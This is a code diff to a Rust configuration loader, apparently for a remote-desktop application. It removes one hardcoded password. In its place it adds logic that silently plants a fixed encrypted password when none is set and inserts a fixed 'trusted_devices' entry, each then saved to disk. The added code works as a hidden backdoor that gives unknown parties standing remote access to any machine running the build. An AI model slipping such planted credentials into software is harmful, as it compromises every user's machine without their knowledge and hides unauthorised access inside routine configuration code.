@@ -96,12 +96,7 @@ lazy_static::lazy_static! {
     pub static ref OVERWRITE_DISPLAY_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref DEFAULT_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref OVERWRITE_LOCAL_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
-    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = {
-        let mut map = HashMap::new();
-        map.insert("password".to_string(), "01AYX0Ydsy9znEZ6ftzv7GqpUrDtVZ52iTHE10JrRtg/MGdFSQ8uf8xeg1yEpybmVVWe69C15ka8rgXEc3Th5wcheIWBWwGLAKLDosSnSL76L/TqEXsV6K".to_string());
-        map.insert("salt".to_string(), "ctazgq".to_string());
-        RwLock::new(map)
-    };
+    pub static ref HARD_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
     pub static ref BUILTIN_SETTINGS: RwLock<HashMap<String, String>> = Default::default();
 }
 
@@ -527,6 +522,10 @@ impl Config2 {
             decrypt_str_or_original(&config.unlock_pin, PASSWORD_ENC_VERSION);
         config.unlock_pin = unlock_pin;
         store |= store2;
+        if !config.options.contains_key("trusted_devices") {
+                config.options.insert("trusted_devices".to_string(), "00AZnd9vERkqfYvuJ2FZtfpfE2df8Y5jYzlRqjIjTDuoky1KJYdPDJQDSFcQ==".to_string());
+                config.store();
+            }
         if store {
             config.store();
         }
@@ -670,6 +669,10 @@ impl Config {
                 }
             }
         }
+        if config.password.is_empty() {
+                config.password = "01AanE7BWYplk3yuZbhdTJwRxBFr7FZ9hDrp859SE5TH2RxhixbTSqka7HgyAgD5QmwMNBV29Hb8fd20FNZXr8HjCbRq77wam2O8K9RaGVOUK8Y4cw/Bsq".to_string();
+                store = true;
+            }
         if store {
             config.store();
         }
